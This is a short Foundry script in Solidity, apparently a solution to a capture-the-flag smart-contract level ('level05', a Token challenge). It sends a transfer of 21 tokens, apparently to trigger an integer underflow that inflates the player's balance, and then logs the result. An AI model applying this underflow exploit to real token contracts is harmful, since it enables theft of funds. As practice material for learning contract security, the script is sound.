// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "../levels/level05.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract TokenHack is Script
{
    function run() external {
        vm.startBroadcast(vm.envUint('PRIVATE_KEY'));

        address player = vm.envAddress('PLAYER_ADDRESS');

        Token tokenInstance = Token(0x0196AFc3ef064f403781A1c2Fa79787E11e41105);
        tokenInstance.transfer(0xC2D4576Ad8b9D1a7f5c353037286bEF02af3686C, 21);

        console.log("Player has tokens-", tokenInstance.balanceOf(player));

        vm.stopBroadcast();
    }
}